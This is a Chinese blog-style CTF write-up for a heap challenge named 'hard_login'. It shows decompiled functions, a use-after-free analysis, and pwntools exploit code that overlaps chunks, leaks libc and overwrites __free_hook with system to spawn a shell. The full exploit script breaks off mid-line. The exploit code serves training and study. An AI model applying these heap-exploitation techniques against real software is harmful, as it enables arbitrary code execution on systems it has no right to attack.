class="keyword">delete</span>((__int64)&amp;v7);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>1.添加功能（add）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE v5[<span class="number">6</span>]; <span class="comment">// [rsp-26h] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp-24h] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( id = <span class="number">0</span>; id &lt;= <span class="number">9</span> &amp;&amp; chunk_state_check[<span class="number">4</span> * id]; ++id )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( id == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your ID:%d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Info size:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">size</span> &lt;= <span class="number">0x7F</span> || <span class="built_in">size</span> &gt; <span class="number">0x500</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    chunk_state_check[<span class="number">4</span> * id] = <span class="built_in">size</span>;</span><br><span class="line">    v1 = id;</span><br><span class="line">    *((_QWORD *)&amp;chunk + <span class="number">2</span> * v1) = <span class="built_in">malloc</span>(<span class="built_in">size</span> + <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !*((_QWORD *)&amp;chunk + <span class="number">2</span> * id) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your name:"</span>, &amp;<span class="built_in">size</span>);</span><br><span class="line">    v2 = *((_QWORD *)&amp;chunk + <span class="number">2</span> * id);</span><br><span class="line">    *(_BYTE *)(v2 + <span class="built_in">read</span>(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;chunk + <span class="number">2</span> * id), <span class="number">0xF</span>uLL)) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your code:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%hu"</span>, v5);</span><br><span class="line">    *(_WORD *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * id) + <span class="number">0x10</span>LL) = *(_WORD *)v5;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your password:"</span>, v5);</span><br><span class="line">    v3 = *((_QWORD *)&amp;chunk + <span class="number">2</span> * id);</span><br><span class="line">    *(_BYTE *)(v3 + <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * id) + <span class="number">0x18</span>LL), <span class="number">7u</span>LL) + <span class="number">0x18</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your info:"</span>);</span><br><span class="line">    v4 = *((_QWORD *)&amp;chunk + <span class="number">2</span> * id);</span><br><span class="line">    *(_BYTE *)(v4 + <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * id) + <span class="number">0x20</span>LL), <span class="built_in">size</span> - <span class="number">1</span>) + <span class="number">0x20</span>) = <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.显示info内容功能（show_info）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall show_info@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp-1Ch] [rbp-1Ch]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your ID:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your password:"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;v3, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v2) + <span class="number">24L</span>L), (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Password error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your info:"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v2) + <span class="number">0x20</span>LL));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.修改密码（find_password）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">find_password</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v2[<span class="number">7</span>]; <span class="comment">// [rsp-27h] [rbp-27h]</span></span><br><span class="line">  _BYTE v3[<span class="number">6</span>]; <span class="comment">// [rsp-26h] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp-24h] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your ID:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> || v4 &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your code:"</span>, &amp;v4);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%hu"</span>, v3);</span><br><span class="line">  <span class="keyword">if</span> ( *(_WORD *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v4) + <span class="number">16L</span>L) != *(_WORD *)v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Code error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your password:"</span>, v3);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v4) + <span class="number">24L</span>L));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to change?(Y/N)"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">" %c"</span>, v2);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v2[<span class="number">0</span>] != <span class="string">'Y'</span> &amp;&amp; v2[<span class="number">0</span>] != <span class="string">'y'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v2[<span class="number">0</span>] != <span class="string">'N'</span> &amp;&amp; v2[<span class="number">0</span>] != <span class="string">'n'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(v2[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"What are you doing?"</span>, v2);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your new password:"</span>, v2);</span><br><span class="line">    v0 = *((_QWORD *)&amp;chunk + <span class="number">2</span> * v4);</span><br><span class="line">    *(_BYTE *)(v0 + <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v4) + <span class="number">24L</span>L), <span class="number">7u</span>LL) + <span class="number">24</span>) = <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.释放堆块（delete）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall <span class="keyword">delete</span>@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp-1Ch] [rbp-1Ch]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your ID:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">10</span> || !chunk_state_check[<span class="number">4</span> * v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your password:"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;v3, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(*((_QWORD *)&amp;chunk + <span class="number">2</span> * v2) + <span class="number">24L</span>L), (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Password error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Done!"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;chunk + <span class="number">2</span> * v2));</span><br><span class="line">  chunk_state_check[<span class="number">4</span> * v2] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解题分析"><a href="#解题分析" class="headerlink" title="解题分析"></a>解题分析</h2><p>在释放堆块（<code>free</code>）时，题目有个<code>if ( v2 &lt; 0 || v2 &gt; 10 || !chunk_state_check[4 * v2] )</code>来限制操作的chunk只能是未释放的。但是<code>find_password</code>和<code>show_info</code>并没有限制。同时，由于free功能里，清除的<code>chunk_state_check[4 * v2] = 0;</code>被不是存储的chunk指针而是chunk的大小。因此造成了UAF利用。</p><p>于是，我们可以利用申请两个unsorted bin chunk 释放让其合并，再制造错位放第二个chunk的残留指针刚好可以修改password同时，info泄露出libc_addr.同时，利用残留指针修改unsorted bin chunk 大小，制造出chunk重叠，从而修改free chunk fd从而修改free_hook为<code>system</code>地址。</p><h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><p>1.申请chunk，制造出uaf。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(129,&#39;lex&#39;,800,&#39;1&#39;*6,&#39;y&#39;*128)#0</span><br><span class="line">add(129,&#39;lex&#39;,800,&#39;1&#39;*6,&#39;y&#39;*128)#1</span><br><span class="line">add(0x400,&#39;lexs&#39;,800,&#39;1&#39;*6,&#39;x&#39;*(0x400-1))#2</span><br><span class="line">add(0x400,&#39;&#39;,0,&#39;1&#39;*6,&#39;x&#39;*0x1)#3</span><br><span class="line">add(0x88,&#39;&#39;,800,&#39;1&#39;*6, &#39;x&#39;*(0x88-1-7)+p64(0x410+0xb0)[:-1])#4</span><br><span class="line">add(129,&#39;&#39;,800,&#39;1&#39;*6, p64( 0x4f0) + p64(0xb0))#5</span><br><span class="line">add(129,&#39;&#39;,800,&#39;1&#39;*6, p64( 0x4f0) + p64(0xb0))#6</span><br><span class="line">free(0,&#39;1&#39;*6)</span><br><span class="line">free(1,&#39;1&#39;*6)</span><br><span class="line"></span><br><span class="line">free(2,&#39;1&#39;*6)</span><br><span class="line">free(3,&#39;1&#39;*6)</span><br><span class="line">add(0x420,&#39;&#39;,800,&#39;1&#39;*6,&#39;x&#39;*(0x400-1))#new_chunk_0</span><br></pre></td></tr></table></figure><p>2.通过chunk_4的残留指针 ,修改0x420 chunk的密码。再通过show功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(3,0,&#39;x&#39;*6)</span><br><span class="line">p.recv()</span><br><span class="line">show(3,&#39;x&#39;*6)</span><br></pre></td></tr></table></figure><p>3.利用第一步就布局的chunk_5和chunk_6,来制造重叠。 </p><p><img src="image-20221002105017934.png" alt="image-20221002105017934"></p><p>通过chunk_4的残留指针，修改new_chunk_0大小0x411为0x4f1.从而为一个0xb0合并成一个unsorted bin chunk。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(3,0,p64( 0x411+0xb0+0x30)[:-1])</span><br></pre></td></tr></table></figure><p><img src="image-20221002104358061.png" alt="image-20221002104358061"></p><p><img src="image-20221002104652016.png" alt="image-20221002104652016"></p><p>4.然后释放unsorted chunk，而释放被包含的0xb0 chunk从而制造出堆重叠。修改0xb0 chunk的fd为<code>__free_hook</code>,修改<code>__free_hook</code>的值的<code>system</code>.从而get shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(4,&#39;1&#39;*6)</span><br><span class="line"></span><br><span class="line">add(0x4c0-0x20,&#39;&#39;,0,&#39;1&#39;*6,&#39;y&#39;*0x3e0+p64(0)+p64(0xb0)+p64(x.dump(&#39;__free_hook&#39;))+p64(0))#3</span><br><span class="line">add(0x88,&#39;&#39;,800,&#39;1&#39;*6, &#39;x&#39;*(0x8))#4</span><br><span class="line">add(0x88,p64(x.dump(&#39;system&#39;)),800,&#39;1&#39;*6,p64(0)*3)#4</span><br><span class="line">add(0x98,&#39;&#x2F;bin&#x2F;sh\x00&#39;,800,&#39;1&#39;*6, &#39;x&#39;*(0x8))#4</span><br><span class="line">free(4,&#39;1&#39;*6)</span><br></pre></td></tr></table></figure><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/09/15 11:25:12</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./hard_login'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,code,password,info)</span>:</span></span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">'Your ID:'</span>)</span><br><span class="line">   print(<span class="string">'id:'</span>+p.recvline())</span><br><span class="line">   p.recvuntil(<span class="string">'Info size:'</span>)</span><br><span class="line">   p.sendline(str(size))</span><br><span class="line">   p.recvuntil(<span class="string">'Your name:'</span>)</span><br><span class="line">   p.sendline(name)</span><br><span class="line">   p.recvuntil(<span class="string">'Your code:'</span>)</span><br><span class="line">   p.sendline(str(code))</span><br><span class="line">   p.recvuntil(<span class="string">'Your password:'</span>)</span><br><span class="line">   p.sendline(str(password))</span><br><span class="line">   p.recvuntil(<span class="string">'Your info:'</span>)  </span><br><span class="line">   p.sendline(str(info))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(id,password)</span>:</span></span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">'Your ID:'</span>)</span><br><span class="line">   p.sendline(str(id))</span><br><span class="line">   p.recvuntil(<span class="string">'Your password:'</span>)</span><br><span class="line">   p.sendline(password)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,code,pw)</span>:</span></span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">'Your ID:'</span>)</span><br><span class="line">   p.sendline(str(id))</span><br><span class="line">   p.recvuntil(<span class="string">'Your code:'</span>)</span><br><span class="line">   p.sendline(str(code))</span><br><span class="line">   print(p.recv())</span><br><span class="line">   p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">'Your new password:'</span>)</span><br><span class="line">   p.sendline(pw)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(id,password)</span>:</span></span><br><span class="line">   p.sendline(<span class="string">'4'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">'Your ID:'</span>)</span><br><span class="line">   p.sendline(str(id))</span><br><span class="line">   p.recvuntil(<span class="string">'Your password:'</span>)</span><br><span class="line">   p.sendline(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">129</span>,<span class="string">'lex'</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'y'</span>*<span class="number">128</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">129</span>,<span class="string">'lex'</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'y'</span>*<span class="number">128</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'lexs'</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'x'</span>*(<span class="number">0x400</span><span class="number">-1</span>))<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">''</span>,<span class="number">0</span>,<span class="string">'1'</span>*<span class="number">6</span>,<span class="string">'x'</span>*<span class="number">0x1</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">''</span>,<span class="number">800</span>,<span class="string">'1'</span>*<span class="number">6</span>, <span class="string">'x'</span>*(<span class="number">0x88</span><span class="number">-1</span><span class="number">-7</span>)+p64(<span class="number">0x410</span>+<span class="number">0xb0</span>)[:<span class="number">-1</span>])<span class="comment">#4</span></span><br><span class="line">add(<span 